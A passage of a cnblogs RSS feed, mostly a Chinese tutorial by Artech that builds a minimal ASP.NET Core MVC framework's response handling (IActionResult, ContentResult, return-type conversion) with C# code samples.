<og:description>原型 原型模式：当创建给定类的过程很昂贵或很复杂时，就使用原型模式。 我们在进行游戏的时候游戏会动态创建怪，而怪时根据场景的不同而变化创建的，英雄自己也会创建一些随从。创建各式各样的怪兽实例，已经越来</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/SunSpring/p/12507777.html</dc:identifier>
</item>
<item>
<title>通过极简模拟框架让你了解ASP.NET Core MVC框架的设计与实现[中篇]：请求的响应 - Artech</title>
<link>http://www.cnblogs.com/artech/p/12550074.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/artech/p/12550074.html</guid>
<description>&lt;div id=&quot;cnblogs_post_description&quot; readability=&quot;35&quot;&gt;&lt;img src=&quot;http://images.cnblogs.com/cnblogs_com/artech/158198/o_.netcore.png&quot; class=&quot;desc_img&quot;/&gt;《200行代码，7个对象——让你了解ASP.NET Core框架的本质》让很多读者对ASP.NET Core管道有了真实的了解。在过去很长一段时间中，有很多人私信给我：能否按照相同的方式分析一下MVC框架的设计与实现原理，希望这篇文章能够满足你们的需求。在对本章内容展开介绍之前，顺便作一下广告：《ASP.NET Core 3框架揭秘》已经开始销售，限时5折优惠还有最后3天，有兴趣的从这里入群购买。&lt;/div&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;169.54467939973&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://img2020.cnblogs.com/blog/19327/202003/19327-20200323085612365-1758013268.jpg&quot;&gt;&lt;img width=&quot;183&quot; height=&quot;239&quot; title=&quot;g5&quot; align=&quot;right&quot; alt=&quot;g5&quot; src=&quot;https://img2020.cnblogs.com/blog/19327/202003/19327-20200323085612647-219130351.jpg&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;《&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-asp-net-core-framework.html&quot;&gt;200行代码，7个对象——让你了解ASP.NET Core框架的本质&lt;/a&gt;》让很多读者对ASP.NET Core管道有了真实的了解。在过去很长一段时间中，有很多人私信给我：能否按照相同的方式分析一下MVC框架的设计与实现原理，希望这篇文章能够满足你们的需求。在对本章内容展开介绍之前，顺便作一下广告：《ASP.NET Core 3框架揭秘》已经开始销售，限时&lt;span&gt;5折&lt;/span&gt;优惠还有&lt;span&gt;最后3天&lt;/span&gt;，有兴趣可以扫描右边二维码或者从&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-asp-net-core-3-sale.html&quot;&gt;这里&lt;/a&gt;入群购买。&lt;/p&gt;
&lt;p&gt;我们在《&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-01.html&quot;&gt;[上篇]：路由整合&lt;/a&gt;》将定义在Controller类型中的Action方法简化成只返回Task或者Void的方法，并让方法自身去完成包括对请求予以相应的所有请求处理任务，但真实的MVC框架并非如此。真正的MVC框架中具有一个名为IActionResult的重要结构，顾名思义，IActionResult对象一般会作为Action方法的返回值，针对请求的响应任务基本上会由这个对象来实现。&lt;/p&gt;
&lt;p&gt;源代码下载：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://files.cnblogs.com/files/artech/S502.7z&quot;&gt;IActionResult的执行&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://files.cnblogs.com/files/artech/S503.7z&quot;&gt;IActionResult的类型转换&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作为Action方法执行结果旨在对请求做最终响应的IActionResult接口同样具有极为简单的定义。如下main的代码片段所示，IActionResult对象针对请求的响应实现在它唯一的ExecuteResultAsync方法中，针对待执行Action的ActionContext上下文是其唯一的输入参数。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IActionResult
{
    Task ExecuteResultAsync(ActionContext context);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;针对不同的请求响应需求，MVC框架为我们定义了一系列的IActionResult实现类型，应用程序同样也可以根据需要定义自己的IActionResult类型。作为演示，我们定义了如下这个ContentResult类型，它将指定的字符串作为响应主体的内容，具体的内容类型（媒体内容或者MIME类型）则可以灵活指定。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ContentResult : IActionResult
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; _content;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; _contentType;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ContentResult(&lt;span&gt;string&lt;/span&gt; content, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; contentType)
    {
        _content &lt;/span&gt;=&lt;span&gt; content;
        _contentType &lt;/span&gt;=&lt;span&gt; contentType;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Task ExecuteResultAsync(ActionContext context)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; response =&lt;span&gt; context.HttpContext.Response;
        response.ContentType &lt;/span&gt;=&lt;span&gt; _contentType;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; response.WriteAsync(_content);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;由于Action方法可能没有返回值，为了使Action执行流程（执行Action方法=&amp;gt;将返回值转化成IActionResult对象=&amp;gt;执行IActionResult对象）显得明确而清晰，我们定义了如下这个“什么都没做”的NullActionResult类型，它利用静态只读属性Instance返回一个单例的NullActionResult对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;sealed&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; NullActionResult : IActionResult
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; NullActionResult() { }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; NullActionResult Instance { &lt;span&gt;get&lt;/span&gt;; } = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NullActionResult();
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Task ExecuteResultAsync(ActionContext context) =&amp;gt;&lt;span&gt; Task.CompletedTask;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;接下来我们将Action方法返回类型的约束放宽，除了Task和Void，Action方法的返回类型还可以是IActionResult、Task&amp;lt;IActionResult&amp;gt;和ValueTask&amp;lt;IActionResult&amp;gt;。基于这个新的约定，我们需要对前面定义的ControllerActionInvoker的InvokeAsync方法作如下的修改。如代码片段所示，在执行目标Action方法之后，我们调用ToActionResultAsync方法将返回对象转换成一个Task&amp;lt;IActionResult&amp;gt;对象，最终针对请求的响应只需要直接执行这个IActionResult对象即可。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ControllerActionInvoker : IActionInvoker
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ActionContext ActionContext { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ControllerActionInvoker(ActionContext actionContext) =&amp;gt; ActionContext =&lt;span&gt; actionContext;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task InvokeAsync()
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; actionDescriptor =&lt;span&gt; (ControllerActionDescriptor)ActionContext.ActionDescriptor;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; controllerType =&lt;span&gt; actionDescriptor.ControllerType;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; requestServies =&lt;span&gt; ActionContext.HttpContext.RequestServices;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; controllerInstance =&lt;span&gt; ActivatorUtilities.CreateInstance(requestServies, controllerType);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (controllerInstance &lt;span&gt;is&lt;/span&gt;&lt;span&gt; Controller controller)
        {
            controller.ActionContext &lt;/span&gt;=&lt;span&gt; ActionContext;
        }
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; actionMethod =&lt;span&gt; actionDescriptor.Method;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; result = actionMethod.Invoke(controllerInstance, &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]);
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; actionResult = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; ToActionResultAsync(result);
        &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; actionResult.ExecuteResultAsync(ActionContext);
    }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt; ToActionResultAsync(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; result)
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (result == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NullActionResult.Instance;
        }

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (result &lt;span&gt;is&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt;&lt;span&gt; taskOfActionResult)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; taskOfActionResult;
        }

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (result &lt;span&gt;is&lt;/span&gt; ValueTask&amp;lt;IActionResult&amp;gt;&lt;span&gt; valueTaskOfActionResult)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; valueTaskOfActionResult;
        }
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (result &lt;span&gt;is&lt;/span&gt;&lt;span&gt; IActionResult actionResult)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; actionResult;
        }

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (result &lt;span&gt;is&lt;/span&gt;&lt;span&gt; Task task)
        {
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; task;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NullActionResult.Instance;
        }

        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; InvalidOperationException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Action method's return value is invalid.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们接下来将前面定义的ContentResult引入到演示实例的FoobarController中。如下面的代码片段所示，我们将Action方法FooAsync和Bar的返回类型分别替换成Task&amp;lt;IActionResult&amp;gt;和IActionResult，具体返回的都是一个ContentResult对象。两个ContentResult对象都将同一段HTML片段作为响应的主体内容，但是FooAsync方法将内容类型设置成 “text/html” ，而Bar方法则将其设置为 “text/plain” 。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FoobarController : Controller
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; _html =
&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Hello&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;p&amp;gt;Hello World!&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

    [HttpGet(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/{foo}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt;&lt;span&gt; FooAsync()
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Task.FromResult&amp;lt;IActionResult&amp;gt;(&lt;span&gt;new&lt;/span&gt; ContentResult(_html, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/html&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IActionResult Bar() =&amp;gt; &lt;span&gt;new&lt;/span&gt; ContentResult(_html, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/plain&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;演示程序启动之后，如果采用与前面一样的URL访问定义在FoobarController的两个Action方法，我们会在浏览器上得到如下图所示的输出结果。由于FooAsync方法将内容类型设置为 “text/html” ，所以浏览器会将返回的内容作为一个HTML文档进行解析，但是Bar方法将内容类型设置为 “text/plain” ，所以返回的内容会原封不动地输出到浏览器上。源代码从&lt;a href=&quot;https://files.cnblogs.com/files/artech/S502.7z&quot;&gt;这里&lt;/a&gt;下载。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://img2020.cnblogs.com/blog/19327/202003/19327-20200323082706998-1935060131.png&quot;&gt;&lt;img width=&quot;406&quot; height=&quot;266&quot; title=&quot;5-2&quot; alt=&quot;5-2&quot; src=&quot;https://img2020.cnblogs.com/blog/19327/202003/19327-20200323082707395-1552618096.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;前面的内容对Task方法的返回类型做出了一系列的约束，但是我们知道在真正的MVC框架中，定义在Controller中的Action方法可以采用任意的类型。为了解决这个问题，我们可以考虑Action方法返回的数据对象转换成一个IActionResult对象。我们将类型转换规则定义成通过IActionResultTypeMapper接口表示的服务，针对IActionResult的类型转换体现在Convert方法上。值得一提的是，Convert方法表示待转换的对象的value参数并不一定是Action方法的返回值，而是具体数据对象。如果Action方法的返回值是一个Task&amp;lt;TResult&amp;gt;或者ValueTask&amp;lt;TResult&amp;gt;对象，它们的Result属性返回的参数这个待转换的数据对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IActionResultTypeMapper
{
    IActionResult Convert(&lt;/span&gt;&lt;span&gt;object&lt;/span&gt;&lt;span&gt; value, Type returnType);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;简单起见，我们定义了如下这个ActionResultTypeMapper类型将作为模拟框架对IActionResultTypeMapper接口的默认实现。如代码片段所示，Convert方法将返回个内容类型为“text/plain”的ContentResult对象，原始对象字符串描述（ToString方法的返回值）将作为响应主题的内容。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ActionResultTypeMapper : IActionResultTypeMapper
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IActionResult Convert(&lt;span&gt;object&lt;/span&gt; value, Type returnType) =&amp;gt; &lt;span&gt;new&lt;/span&gt; ContentResult(value.ToString(), &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/plain&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当我们将针对Action方法返回类型的限制去除之后，我们的ControllerActionInvoker自然需要作进一步修改。Action方法可能会返回一个Task&amp;lt;TResult&amp;gt;或者ValueTask&amp;lt;TResult&amp;gt;对象（泛型参数TResult可以是任意类型），所以我们在ControllerActionInvoker类型定义了如下两个静态方法（ConvertFromTaskAsync&amp;lt;TValue&amp;gt;和ConvertFromValueTaskAsync&amp;lt;TValue&amp;gt;）将它们转换成Task&amp;lt;IActionResult&amp;gt;对象，如果返回的不是一个IActionResult对象，作为参数的IActionResultTypeMapper对象将来进行类型转换。我们定义在两个静态只读字段（_taskConvertMethod和_valueTaskConvertMethod）来保存描述这两个泛型方法的MethodInfo对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ControllerActionInvoker : IActionInvoker
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; MethodInfo _taskConvertMethod;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; MethodInfo _valueTaskConvertMethod;

    &lt;/span&gt;&lt;span&gt;static&lt;/span&gt;&lt;span&gt; ControllerActionInvoker()
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; bindingFlags = BindingFlags.Instance | BindingFlags.NonPublic |&lt;span&gt; BindingFlags.Static;
        _taskConvertMethod &lt;/span&gt;= &lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(ControllerActionInvoker).GetMethod(nameof(ConvertFromTaskAsync), bindingFlags);
        _valueTaskConvertMethod &lt;/span&gt;= &lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(ControllerActionInvoker).GetMethod(nameof(ConvertFromValueTaskAsync), bindingFlags);
    }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt; ConvertFromTaskAsync&amp;lt;TValue&amp;gt;(Task&amp;lt;TValue&amp;gt;&lt;span&gt; returnValue, IActionResultTypeMapper mapper)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; result = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; returnValue;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; result &lt;span&gt;is&lt;/span&gt;&lt;span&gt; IActionResult actionResult
            &lt;/span&gt;?&lt;span&gt; actionResult
            : mapper.Convert(result, &lt;/span&gt;&lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(TValue));
    }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt; ConvertFromValueTaskAsync&amp;lt;TValue&amp;gt;( ValueTask&amp;lt;TValue&amp;gt;&lt;span&gt; returnValue, IActionResultTypeMapper mapper)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; result = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; returnValue;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; result &lt;span&gt;is&lt;/span&gt;&lt;span&gt; IActionResult actionResult
            &lt;/span&gt;?&lt;span&gt; actionResult
            : mapper.Convert(result, &lt;/span&gt;&lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(TValue));
    }
    …
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如下所示的是InvokeAsync方法针对Action的执行。在执行了目标Action方法并得到原始的返回值后，我们调用了ToActionResultAsync方法将返回值转换成Task&amp;lt;IActionResult&amp;gt;，最终通过执行IActionResult对象进而完成所有的请求处理任务。如果返回类型为Task&amp;lt;TResult&amp;gt;或者ValueTask&amp;lt;TResult&amp;gt;，我们会直接采用反射的方式调用ConvertFromTaskAsync&amp;lt;TValue&amp;gt;或者ConvertFromValueTaskAsync&amp;lt;TValue&amp;gt;方法（更好的方式是采用表达式树的方式执行类型转换方法以获得更好的性能）。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ControllerActionInvoker : IActionInvoker
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task InvokeAsync()
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; actionDescriptor =&lt;span&gt; (ControllerActionDescriptor)ActionContext.ActionDescriptor;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; controllerType =&lt;span&gt; actionDescriptor.ControllerType;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; requestServies =&lt;span&gt; ActionContext.HttpContext.RequestServices;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; controllerInstance =&lt;span&gt; ActivatorUtilities.CreateInstance(requestServies, controllerType);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (controllerInstance &lt;span&gt;is&lt;/span&gt;&lt;span&gt; Controller controller)
        {
            controller.ActionContext &lt;/span&gt;=&lt;span&gt; ActionContext;
        }
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; actionMethod =&lt;span&gt; actionDescriptor.Method;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; returnValue = actionMethod.Invoke(controllerInstance, &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]);
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; mapper = requestServies.GetRequiredService&amp;lt;IActionResultTypeMapper&amp;gt;&lt;span&gt;();
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; actionResult = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; ToActionResultAsync(
            returnValue, actionMethod.ReturnType, mapper);
        &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; actionResult.ExecuteResultAsync(ActionContext);
    }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; Task&amp;lt;IActionResult&amp;gt; ToActionResultAsync(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; returnValue, Type returnType, IActionResultTypeMapper mapper)
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Null&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (returnValue == &lt;span&gt;null&lt;/span&gt; || returnType == &lt;span&gt;typeof&lt;/span&gt;(Task) || returnType == &lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(ValueTask))
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Task.FromResult&amp;lt;IActionResult&amp;gt;&lt;span&gt;(NullActionResult.Instance);
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;IActionResult&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (returnValue &lt;span&gt;is&lt;/span&gt;&lt;span&gt; IActionResult actionResult)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Task.FromResult(actionResult);
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Task&amp;lt;TResult&amp;gt;&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (returnType.IsGenericType &amp;amp;&amp;amp; returnType.GetGenericTypeDefinition() == &lt;span&gt;typeof&lt;/span&gt;(Task&amp;lt;&amp;gt;&lt;span&gt;))
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; declaredType =&lt;span&gt; returnType.GenericTypeArguments.Single();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; taskOfResult = _taskConvertMethod.MakeGenericMethod(declaredType).Invoke(&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;&lt;span&gt;[] { returnValue, mapper });
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Task&amp;lt;IActionResult&amp;gt;&lt;span&gt;)taskOfResult;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ValueTask&amp;lt;TResult&amp;gt;&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (returnType.IsGenericType &amp;amp;&amp;amp; returnType.GetGenericTypeDefinition() == &lt;span&gt;typeof&lt;/span&gt;(ValueTask&amp;lt;&amp;gt;&lt;span&gt;))
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; declaredType =&lt;span&gt; returnType.GenericTypeArguments.Single();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; valueTaskOfResult = _valueTaskConvertMethod.MakeGenericMethod(declaredType).Invoke(&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;&lt;span&gt;[] { returnValue, mapper });
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Task&amp;lt;IActionResult&amp;gt;&lt;span&gt;)valueTaskOfResult;
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Task.FromResult(mapper.Convert(returnValue, returnType));
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;从上面的代码片段可以看出，在进行针对IActionResult的类型转换过程中使用到的IActionResultTypeMapper对象是从针对当前请求的依赖注入容器中提取的，所以我们在应用启动之前需要作针对性的服务注册。我们将针对IActionResultTypeMapper的服务注册添加到之前定义的AddMvcControllers扩展方法中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ServiceCollectionExtensions
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; IServiceCollection AddMvcControllers(&lt;span&gt;this&lt;/span&gt;&lt;span&gt; IServiceCollection services)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; services
            .AddSingleton&lt;/span&gt;&amp;lt;IActionDescriptorCollectionProvider, DefaultActionDescriptorCollectionProvider&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;IActionInvokerFactory, ActionInvokerFactory&amp;gt;&lt;span&gt;()
            .AddSingleton &lt;/span&gt;&amp;lt;IActionDescriptorProvider, ControllerActionDescriptorProvider&amp;gt;&lt;span&gt;()
            .AddSingleton&lt;/span&gt;&amp;lt;ControllerActionEndpointDataSource, ControllerActionEndpointDataSource&amp;gt;&lt;span&gt;()
           &lt;/span&gt;&lt;span&gt; .AddSingleton&amp;lt;IActionResultTypeMapper, ActionResultTypeMapper&amp;gt;();&lt;/span&gt;&lt;span&gt;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;为了验证模拟框架对Action方法的任意返回类型的支持，我们将前面演示实例定义的FoobarController做了如下的修改。如代码片段所示，我们在FoobarController类型中定义了四个Action方法，它们返回的类型分别为Task&amp;lt;ContentResult&amp;gt;、ValueTask&amp;lt;ContentResult&amp;gt;、Task&amp;lt;String&amp;gt;、ValueTask&amp;lt;String&amp;gt;，ContentResult对象的内容和直接返回的字符串都是一段相同的HTML。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FoobarController : Controller
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; _html =
&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Hello&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;p&amp;gt;Hello World!&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

    [HttpGet(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Task&amp;lt;ContentResult&amp;gt;&lt;span&gt; FooAsync()
